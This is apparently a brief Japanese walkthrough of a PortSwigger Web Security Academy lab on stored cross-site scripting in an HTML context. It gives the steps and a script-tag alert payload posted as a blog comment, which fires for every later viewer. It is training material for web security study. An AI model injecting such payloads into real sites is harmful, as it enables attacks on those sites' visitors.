# 何もエンコードせずに XSS を HTML コンテキストに保存

以下のハッキングラボを実施します
https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

- 1. ハッキングラボにアクセスします
- 2. ブログのコメント欄に以下のコメントを残します

```html
<script>
  alert(1);
</script>
```

コメントを見る度にアラートが表示されるようになります
